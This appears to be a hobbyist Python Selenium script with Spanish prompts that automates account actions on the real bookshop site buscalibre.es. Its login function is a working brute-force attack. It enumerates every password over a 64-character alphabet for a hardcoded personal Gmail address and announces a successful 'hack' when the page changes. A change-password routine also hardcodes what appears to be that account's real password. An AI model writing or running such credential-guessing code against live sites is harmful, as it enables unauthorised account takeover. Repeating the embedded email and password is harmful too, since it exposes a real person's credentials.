from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

def CrearCuenta():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.buscalibre.es/")
    time.sleep(2)
    driver.find_element_by_partial_link_text('Quedarme').click()
    driver.find_element_by_id("iniciarSesion").click()
    time.sleep(3)
    driver.find_element_by_id("signin_username").send_keys(str(input("Email\n")))
    driver.find_element_by_xpath("//button[@id='submit_login']").click()
    driver.find_element_by_xpath("//input[@id='signup_nombre'][@name='nombre']").send_keys(str(input("Nombre")))
    driver.find_element_by_xpath("//input[@id='signup_apellido'][@name='apellido']").send_keys(str(input("Apellido")))
    pas=str(input("Contrasena"))
    driver.find_element_by_xpath("//input[@id='signup_clave'][@name='password']").send_keys(pas)
    driver.find_element_by_xpath("//input[@id='signup_confirmar_clave'][@name='confirm_password']").send_keys(pas)
    driver.find_element_by_xpath("//button[@id='submit_login'][@type='submit']").click()
    time.sleep(10)
    driver.quit()

def Iniciar():
    dic="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    bool = False
    contador=0
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.buscalibre.es/")
    time.sleep(2)
    driver.find_element_by_partial_link_text('Quedarme').click()
    driver.find_element_by_id("iniciarSesion").click()
    time.sleep(3)
    driver.find_element_by_id("signin_username").send_keys("fpalmatrejo@gmail.com")
    driver.find_element_by_id("signin_username").send_keys(Keys.RETURN)
    time.sleep(5)
    for i in range(1,552):
        n=len(dic)**i
        pas=""
        for j in range(n):
            aux=j
            pas=""
            for e in range(1,i+1):
                pas+=dic[aux%len(dic)]
                aux=int(aux/len(dic))
            contador+=1
            print("Intento: "+str(contador))
            driver.find_element_by_xpath("//input[@id='signin_password'][@name='password']").clear()
            driver.find_element_by_xpath("//input[@id='signin_password'][@name='password']").send_keys(pas)
            driver.find_element_by_xpath("//input[@id='signin_password'][@name='password']").send_keys(Keys.RETURN)
            time.sleep(2)
            if driver.title == "Buscalibre | Compra Libros con Envío a todo el país":
                print("Se ha hackeado Buscalibre con exito.")
                bool=True
                break
        if bool:
            break
    time.sleep(5)
    driver.quit()

def Cambiar():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.buscalibre.es/")
    time.sleep(2)
    driver.find_element_by_partial_link_text('Quedarme').click()
    driver.find_element_by_id("iniciarSesion").click()
    time.sleep(1)
    driver.find_element_by_id("signin_username").send_keys("fpalmatrejo@gmail.com")
    driver.find_element_by_xpath("//button[@id='submit_login']").click()
    time.sleep(1)
    driver.find_element_by_xpath("//input[@id='signin_password'][@name='password']").send_keys("kA")
    driver.find_element_by_xpath("//input[@id='signin_password'][@name='password']").send_keys(Keys.RETURN)
    time.sleep(1)
    driver.find_element_by_id("iniciarSesion").click()
    cambio = driver.find_elements_by_partial_link_text('Cambio de Clave')
    time.sleep(5)
    for i in cambio:
        time.sleep(1)
        i.click()
    time.sleep(3)
    driver.find_element_by_xpath("//input[@placeholder='Clave Actual'][@name='form[password]']").send_keys("kA")
    pas = str(input("Nueva contraseña"))
    driver.find_element_by_xpath("//input[@placeholder='Nueva Clave'][@name='form[new_password]']").send_keys(pas)
    driver.find_element_by_xpath("//input[@placeholder='Reingrese Nueva Clave'][@name='form[new_password_confirm]']").send_keys(pas)
    driver.find_element_by_xpath("//input[@placeholder='Reingrese Nueva Clave'][@name='form[new_password_confirm]']").send_keys(Keys.RETURN)
    time.sleep(5)
    driver.quit()

def Restablecer():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.buscalibre.es/")
    time.sleep(2)
    driver.find_element_by_partial_link_text('Quedarme').click()
    driver.find_element_by_id("iniciarSesion").click()
    time.sleep(3)
    driver.find_element_by_id("signin_username").send_keys("fpalmatrejo@gmail.com")
    driver.find_element_by_xpath("//button[@id='submit_login']").click()
    time.sleep(2)
    olvido = driver.find_element_by_partial_link_text('Olvidaste')
    olvido.click()
    driver.quit()
print("Hola Mr. Robot")
while True:
    print("\n¿Que desea realizar?\n1)Crear cuenta.\n2)Iniciar sesión.\n3)Cambiar contraseña.\n4)Restablecer la contraseña.\n5)Salir.")
    opcion=int(input("Ingrese el numero junto a su opción: "))
    if opcion == 1:
        CrearCuenta()
    elif opcion == 2:
        Iniciar()
    elif opcion == 3:
        Cambiar()
    elif opcion == 4:
        Restablecer()
    elif opcion == 5:
        print("Hasta luego. ¡bipbupbip-ps!")
        break
    else:
        print("Opción no valida.")
